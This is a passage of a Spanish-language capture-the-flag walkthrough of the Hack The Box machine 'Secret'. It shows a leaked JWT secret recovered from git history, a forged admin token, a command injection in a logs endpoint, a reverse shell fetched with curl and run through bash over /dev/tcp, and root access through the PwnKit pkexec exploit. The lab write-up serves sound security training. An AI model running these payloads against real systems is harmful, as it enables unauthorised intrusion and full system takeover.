commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
(END)
```

Ahora con el comando show podemos ver estos commit y vemos que en uno de ellos se cambiÃ³ el TOKEN_SECRET

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web/.git]
â””â”€â”€â•¼ #git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web/.git]
â””â”€â”€â•¼ #git show e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server ðŸ˜ƒ

diff --git a/routes/private.js b/routes/private.js
index 1347e8c..cf6bf21 100644
--- a/routes/private.js
+++ b/routes/private.js
@@ -11,10 +11,10 @@ router.get('/priv', verifytoken, (req, res) => {
     
     if (name == 'theadmin'){
         res.json({
-            role:{
-
-                role:"you are admin", 
-                desc : "{flag will be here}"
+            creds:{
+                role:"admin", 
+                username:"theadmin",
+                desc : "welcome back admin,"
             }
         })
     }
@@ -26,7 +26,32 @@ router.get('/priv', verifytoken, (req, res) => {
             }
         })
     }
+})
+
 
+router.get('/logs', verifytoken, (req, res) => {
+    const file = req.query.file;
+    const userinfo = { name: req.user }
+    const name = userinfo.name.name;
+    
+    if (name == 'theadmin'){
+        const getLogs = `git log --oneline ${file}`;
+        exec(getLogs, (err , output) =>{
+            if(err){
+                res.status(500).send(err);
+                return
+            }
+            res.json(output);
+        })
+    }
+    else{
+        res.json({
+            role: {
+                role: "you are normal user",
+                desc: userinfo.name.name
+            }
+        })
+    }
 })
 
 router.use(function (req, res, next) {
@@ -40,4 +65,4 @@ router.use(function (req, res, next) {
 });
 
 
-module.exports = router
\ No newline at end of file
+module.exports = router
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web/.git]
â””â”€â”€â•¼ #git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

Ya con estos datos podemos tratar de generar un token valido con los datos que nos dice en el archivo routes/auth.js, podemos los datos del usuario administrador que encontramos y vamos a poner el TOKEN_SECRET 

![10.png](/assets/images/2022-05-10-Secret/10.png)

Al modificarlo vamos a probar el token para ver si nos devuelve algo exitoso 

![11.png](/assets/images/2022-05-10-Secret/11.png)

Lo probamos en el burp como hicimos con nuestro token y nos devuelve un 200 ok

![12.png](/assets/images/2022-05-10-Secret/12.png)

ya en este punto tenemos un token valido, ahora debemos buscar una forma de escalar o tener una shell, dentro del archivo private que vimos anteriormente vemos que estÃ¡ haciendo un llamado en /logs y vemos que llama a una variable file

```csharp
  32   â”‚ router.get('/logs', verifytoken, (req, res) => {
  33   â”‚     const file = req.query.file;
  34   â”‚     const userinfo = { name: req.user }
  35   â”‚     const name = userinfo.name.name;
  36   â”‚     
  37   â”‚     if (name == 'theadmin'){
  38   â”‚         const getLogs = `git log --oneline ${file}`;
  39   â”‚         exec(getLogs, (err , output) =>{
  40   â”‚             if(err){
  41   â”‚                 res.status(500).send(err);
  42   â”‚                 return
  43   â”‚             }
  44   â”‚             res.json(output);
  45   â”‚         })
  46   â”‚     }
  47   â”‚     else{
  48   â”‚         res.json({
  49   â”‚             role: {
  50   â”‚                 role: "you are normal user",
  51   â”‚                 desc: userinfo.name.name
  52   â”‚             }
  53   â”‚         })
  54   â”‚     }
  55   â”‚ })
  56   â”‚ 
  57   â”‚ router.use(function (req, res, next) {
  58   â”‚     res.json({
  59   â”‚         message: {
  60   â”‚ 
  61   â”‚             message: "404 page not found",
  62   â”‚             desc: "page you are looking for is not found. "
  63   â”‚         }
  64   â”‚     })
  65   â”‚ });
```

AsÃ­ que vamos a tratar de llamar este directorio y vemos que nos devuelve un mensaje

![13.png](/assets/images/2022-05-10-Secret/13.png)

Vamos a llamar la variable y ver si nos trae algo y tratamos de ejecucar un comando, pero vemos que directamente no nos trae nada

![14.png](/assets/images/2022-05-10-Secret/14.png)

AsÃ­ que vamos a probar como en otras mÃ¡quinas tratando de ejecutar algÃºn comando poniendo un punto y coma antes para realizar otro comando y vemos que ya estamos ejecutando comandos, asÃ­ que vamos a tratar de tener una reverse shell en nuestro equipo 

![15.png](/assets/images/2022-05-10-Secret/15.png)

En [https://weibell.github.io/reverse-shell-generator/](https://weibell.github.io/reverse-shell-generator/) podemos generar una reverse shell con bash y podemos ejecutarla de varias maneras, pero para este ejemplo vamos a crear un archivo en bash en nuestra mÃ¡quina y tratamos de ejecutala con curl 

![16.png](/assets/images/2022-05-10-Secret/16.png)

Ahora nos creamos un archivo con esta reverse shell

```csharp

```

y encodeamos la peticiÃ³n en urlencode

![17.png](/assets/images/2022-05-10-Secret/17.png)

Nos creamos un servicio web en donde tenemos nuestro archivo

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #cat rev.sh 
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: rev.sh
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚ bash -i >& /dev/tcp/10.10.14.139/443 0>&1
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #python3 -m http.server 80
```

Ponemos nuestra mÃ¡quina a la escucha

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/File/local-web/.git]
â””â”€â”€â•¼ #nc -nlvp 443
listening on [any] 443 ...
```

y realizamos una peticiÃ³n por  curl para ejecutar nuestro comando encodeado

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret/file/local-web]
â””â”€â”€â•¼ #curl -v -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWZkZTFiMDdhMzdmOTA0NjVkOTMwYjgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRoZWFkbWluQGRhc2l0aC53b3JrcyJ9.K2fiX8ai7BImNycQHMDjwd_TudCK7T6sTJeBHSzfpSA" "http://10.10.11.120/api/logs?file=;curl+http%3A%2F%2F10.10.14.139%2Frev.sh+%7C+bash";echo
*   Trying 10.10.11.120:80...
* Connected to 10.10.11.120 (10.10.11.120) port 80 (#0)
> GET /api/logs?file=;curl+http%3A%2F%2F10.10.14.139%2Frev.sh+%7C+bash HTTP/1.1
> Host: 10.10.11.120
> User-Agent: curl/7.74.0
> Accept: */*
> auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWZkZTFiMDdhMzdmOTA0NjVkOTMwYjgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRoZWFkbWluQGRhc2l0aC53b3JrcyJ9.K2fiX8ai7BImNycQHMDjwd_TudCK7T6sTJeBHSzfpSA
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 05 Feb 2022 04:20:03 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 105
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"69-arz5VOTSEpuFprM2d67tJcixaeo"
< 
* Connection #0 to host 10.10.11.120 left intact
{"killed":false,"code":1,"signal":null,"cmd":"git log --oneline ;curl http://10.10.14.139/rev.sh | bash"}
```

y de esta manera tenemos nuestra Reverse Shell

![18.png](/assets/images/2022-05-10-Secret/18.png)

Vamos a ver que archivos tienen permisos SUID y vemos que tenemos el binario pkexec, asÃ­ que vamos a probar el cvs que saliÃ³ hace poco para escalar privilegios https://github.com/ly4k/PwnKit

```csharp
dasith@secret:~/local-web$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
dasith@secret:~/local-web$
```

Nos descargamos el binario

```csharp
â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit

â”Œâ”€[root@angussmoody]â”€[/mnt/angussMoody/Machines/Secret]
â””â”€â”€â•¼ #ll PwnKit 
Permissions Size User        Date Modified Name
.rwxrwxrwx   14k angussmoody  4 feb 23:29  PwnKit
```

Y no lo pasamos a nuestra mÃ¡quina victima y nos descargamos el binario

```csharp
dasith@secret:/tmp$ wget http://10.10.14.139:8000/Pwnkit
wget http://10.10.14.139:8000/Pwnkit
--2022-02-05 04:36:12--  http://10.10.14.139:8000/Pwnkit
Connecting to 10.10.14.139:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14688 (14K) [application/octet-stream]
Saving to: â€˜Pwnkitâ€™

Pwnkit              100%[===================>]  14.34K  --.-KB/s    in 0.08s   

2022-02-05 04:36:12 (180 KB/s) - â€˜Pwnkitâ€™ saved [14688/14688]

dasith@secret:/tmp$ chmod +x Pwnkit
chmod +x Pwnkit
dasith@secret:/tmp$ ./Pwnkit
./Pwnkit
root@secret:/tmp# whoami && id && hostname
whoami && id && hostname
root
uid=0(root) gid=0(root) groups=0(root),1000(dasith)
secret
```